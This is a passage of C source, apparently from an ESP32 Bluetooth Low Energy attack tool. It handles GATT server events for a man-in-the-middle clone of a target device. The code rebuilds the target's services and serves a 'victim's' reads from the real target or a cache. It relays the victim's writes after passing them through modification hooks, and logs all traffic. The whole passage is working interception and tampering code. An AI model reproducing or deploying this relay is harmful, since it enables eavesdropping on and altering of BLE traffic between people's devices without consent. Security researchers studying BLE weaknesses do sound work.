// Included in GattAttack.c to share callback state within one C translation unit.
  case ESP_GATTS_REG_EVT: {
    /**
     * Once we the client has received
     * all services from the target
     * device we start up our gatt
     * server.
     *
     * Here we create a service for each
     * one found in our clone struct.
     */
    clone.gatts_if = gatts_if;

    char send[18];
    snprintf(send, 18, "GOT %i SERVICES", (int)clone.num_services);
    gatt_send_output(send, false);

    for (size_t i = 0; i < clone.num_services; i++) {
      // calculate # of handles
      uint16_t total = clone.services[i].end_handle - clone.services[i].start_handle + 1;
      if (i + 1 < clone.num_services) {
        total = clone.services[i + 1].start_handle - clone.services[i].start_handle;
      }

      esp_gatt_srvc_id_t service;
      service.is_primary = true;
      service.id.inst_id = 0x00;

      if (clone.services[i].service_uuid.len == ESP_UUID_LEN_16) {
        service.id.uuid.len = ESP_UUID_LEN_16;
        service.id.uuid.uuid.uuid16 = clone.services[i].service_uuid.uuid.uuid16;
      } else if (clone.services[i].service_uuid.len == ESP_UUID_LEN_32) {
        service.id.uuid.len = ESP_UUID_LEN_32;
        service.id.uuid.uuid.uuid32 = clone.services[i].service_uuid.uuid.uuid32;
      } else {
        service.id.uuid.len = ESP_UUID_LEN_128;
        memcpy(service.id.uuid.uuid.uuid128, clone.services[i].service_uuid.uuid.uuid128, 16);
      }

      esp_err_t ret = esp_ble_gatts_create_service(gatts_if, &service, total);
      if (ret != ESP_OK) {
        ESP_LOGI(TAG, "create service failed: %s", esp_err_to_name(ret));
      }
    }

    break;
  }
  case ESP_GATTS_READ_EVT: {
    /**
     * When a victim sends a read
     * event to a target device
     *
     * We log the information and read
     * from the real target device.
     *
     * The response is handled in the client.
     * ESP_GATTC_WRITE_EVT
     */
    char uuid[38] = {0};
    bool isDescriptor = handle_is_descriptor(param->read.handle);
    clone.server_conn_id = param->read.conn_id;
    clone.server_trans_id = param->read.trans_id;
    get_uuid_for_handle(param->read.handle, uuid);

    log_and_send_json("READ", connected ? "victim -> target" : "victim -> cache",
                      isDescriptor ? "DESC" : "CHAR", clone.gattc_if, clone.target_client_conn_id,
                      param->read.trans_id, param->read.handle, 0, uuid, NULL);

    if (connected) {
      if (!isDescriptor) {
        esp_ble_gattc_read_char(clone.gattc_if, clone.target_client_conn_id, param->read.handle,
                                ESP_GATT_AUTH_REQ_NONE);
      } else {
        esp_ble_gattc_read_char_descr(clone.gattc_if, clone.target_client_conn_id,
                                      param->read.handle, ESP_GATT_AUTH_REQ_NONE);
      }
    } else {
      esp_gatt_rsp_t rsp;
      memset(&rsp, 0, sizeof(esp_gatt_rsp_t));
      rsp.attr_value.handle = param->read.handle;
      uint8_t *value = NULL;
      bool found = false;

      for (int x = 0; x < clone.num_services; x++) {
        for (int y = 0; y < clone.services[x].num_chars; y++) {
          if (clone.services[x].chars[y].char_handle == param->read.handle) {
            rsp.attr_value.len = clone.services[x].chars[y].value.attr_len;
            value = (uint8_t *)realloc(value, rsp.attr_value.len);
            if (!value && rsp.attr_value.len)
              break;
            memcpy(value, clone.services[x].chars[y].value.attr_value, rsp.attr_value.len);
            found = true;
            goto after_find_read;
          } else {
            for (int z = 0; z < clone.services[x].chars[y].num_descs; z++) {
              if (clone.services[x].chars[y].descs[z].desc_handle == param->read.handle) {
                rsp.attr_value.len = clone.services[x].chars[y].descs[z].value.attr_len;
                value = (uint8_t *)realloc(value, rsp.attr_value.len);
                if (!value && rsp.attr_value.len)
                  break;
                memcpy(value, clone.services[x].chars[y].descs[z].value.attr_value,
                       rsp.attr_value.len);
                found = true;
                goto after_find_read;
              }
            }
          }
        }
      }

    after_find_read:
      if (!found || rsp.attr_value.len == 0) {
        rsp.attr_value.len = 1;
        value = (uint8_t *)realloc(value, rsp.attr_value.len);
        if (!value)
          break;
        value[0] = 0x01;
      }

      char *hexVal = bytes_to_hex_string(value, rsp.attr_value.len);

      memcpy(rsp.attr_value.value, value, rsp.attr_value.len);
      free(value);
      esp_ble_gatts_send_response(clone.gatts_if, clone.server_conn_id, clone.server_trans_id,
                                  ESP_GATT_OK, &rsp);

      log_and_send_json("READ RSP", "cache -> victim", isDescriptor ? "DESC" : "CHAR",
                        clone.gattc_if, clone.target_client_conn_id, param->read.trans_id,
                        param->read.handle, 0, uuid, hexVal);

      free(hexVal);
    }

    break;
  }
  case ESP_GATTS_WRITE_EVT: {
    /**
     * When a victim sends a write
     * event to a target device
     *
     * We run hooks, log the information
     * and write it to the real target
     * device.
     *
     * The response is handled in the client.
     */
    int outSize = 300 + param->write.len;
    char *out = (char *)malloc(outSize);
    if (!out) {
      ESP_LOGE(TAG, "Failed to allocate memory for out buffer");
      return;
    }

    if (param->write.is_prep) {
      prep_write_event_env(param);
      free(out);
      break;
    }
    char uuid[38] = {0};
    bool isDescriptor = handle_is_descriptor(param->write.handle);
    uint16_t write_len = param->write.len;
    if (write_len > ESP_GATT_MAX_ATTR_LEN) {
      free(out);
      break;
    }
    uint8_t *write_value = NULL;
    if (write_len > 0) {
      write_value = (uint8_t *)malloc(write_len);
      if (!write_value) {
        free(out);
        break;
      }
      memcpy(write_value, param->write.value, write_len);
    }
    if (param->write.need_rsp) {
      if (pending_write.active) {
        esp_ble_gatts_send_response(gatts_if, param->write.conn_id, param->write.trans_id,
                                    ESP_GATT_BUSY, NULL);
        free(write_value);
        free(out);
        break;
      }
      pending_write = (pending_write_t){true, isDescriptor, param->write.conn_id,
                                        param->write.trans_id, param->write.handle};
    }
    get_uuid_for_handle(param->write.handle, uuid);

    esp_gatt_write_type_t write_type =
        param->write.need_rsp ? ESP_GATT_WRITE_TYPE_RSP : ESP_GATT_WRITE_TYPE_NO_RSP;

    // Handle Descriptor Notfiy/Indicate
    if (isDescriptor && param->write.len == 2) {
      /*
       * We need to enabled the notification for the PARENT
       * characterics, not this desc handle..
       */
      uint16_t notification_target_handle = get_desc_parent_char_handle(param->write.handle);
      uint16_t bit_value = param->write.value[1] << 8 | param->write.value[0];

      if (bit_value == 0x0001) {
        sprintf(out, "Notifiy Enabled - handle: 0x%02x uuid: %s", notification_target_handle, uuid);
        gatt_send_output(out, false);

        esp_err_t ret = esp_ble_gattc_register_for_notify(clone.gattc_if, clone.target_bda,
                                                          notification_target_handle);

        if (ret != ESP_OK) {
          ESP_LOGI(TAG, "Error gattc_register_for_notify: %s", esp_err_to_name(ret));
        }
      } else if (bit_value == 0x0002) {
        sprintf(out, "Indicate Enabled - handle: 0x%02x uuid: %s", notification_target_handle,
                uuid);
        gatt_send_output(out, false);

        esp_err_t ret = esp_ble_gattc_register_for_notify(clone.gattc_if, clone.target_bda,
                                                          notification_target_handle);
      } else if (bit_value == 0x0000) {
        sprintf(out, "Notifiy/Indicate Disabled - handle: 0x%02x uuid: %s",
                notification_target_handle, uuid);
        gatt_send_output(out, false);

        esp_err_t ret = esp_ble_gattc_unregister_for_notify(clone.gattc_if, clone.target_bda,
                                                            notification_target_handle);

        if (ret != ESP_OK) {
          ESP_LOGI(TAG, "Error gattc_unregister_for_notify: %s", esp_err_to_name(ret));
        } else {
          sprintf(out, "Unregistered Notfication/Indicate - handle: 0x%02x uuid: %s",
                  notification_target_handle, uuid);
          gatt_send_output(out, false);
        }
      }
    }

    char *hex_value = bytes_to_hex_string(param->write.value, param->write.len);
    apply_hook("write", uuid, &hex_value, &write_value, &write_len);

    log_and_send_json("WRITE", connected ? "victim -> target" : "victim -> cache",
                      isDescriptor ? "DESC" : "CHAR", clone.gattc_if, clone.target_client_conn_id,
                      param->write.trans_id, param->write.handle, 0, uuid, hex_value);

    if (connected) {
      esp_err_t status;

      if (isDescriptor) {
        status = esp_ble_gattc_write_char_descr(clone.gattc_if, clone.target_client_conn_id,
                                                param->write.handle, write_len, write_value,
                                                write_type, ESP_GATT_AUTH_REQ_NONE);
      } else {
        status = esp_ble_gattc_write_char(clone.gattc_if, clone.target_client_conn_id,
                                          param->write.handle, write_len, write_value, write_type,
                                          ESP_GATT_AUTH_REQ_NONE);
      }

      if (status != ESP_GATT_OK) {
        ESP_LOGE(TAG, "esp_ble_gattc_write error %s", esp_err_to_name(status));
        if (param->write.need_rsp)
          finish_pending_write(ESP_GATT_ERROR);
      }
    }

    free(out);
    free(hex_value);

    // Write to cache
    for (int x = 0; x < clone.num_services; x++) {
      for (int y = 0; y < clone.services[x].num_chars; y++) {
        if (clone.services[x].chars[y].char_handle == param->write.handle) {
          uint8_t *cached = (uint8_t *)malloc(write_len ? write_len : 1);
          if (cached) {
            if (write_len)
              memcpy(cached, write_value, write_len);
            free(clone.services[x].chars[y].value.attr_value);
            clone.services[x].chars[y].value.attr_value = cached;
            clone.services[x].chars[y].value.attr_len = write_len;
          }
          goto after_find_write;
        } else {
          for (int z = 0; z < clone.services[x].chars[y].num_descs; z++) {
            if (clone.services[x].chars[y].descs[z].desc_handle == param->write.handle) {
              uint8_t *cached = (uint8_t *)malloc(write_len ? write_len : 1);
              if (cached) {
                if (write_len)
                  memcpy(cached, write_value, write_len);
                free(clone.services[x].chars[y].descs[z].value.attr_value);
                clone.services[x].chars[y].descs[z].value.attr_value = cached;
                clone.services[x].chars[y].descs[z].value.attr_len = write_len;
              }
              goto after_find_write;
            }
          }
        }
      }
    }

  after_find_write:
    free(write_value);
    // Connected writes are acknowledged only by their matching target
    // completion callback. Cached writes can complete immediately.
    if (!connected && param->write.need_rsp)
      finish_pending_write(ESP_GATT_OK);

    break;
  }
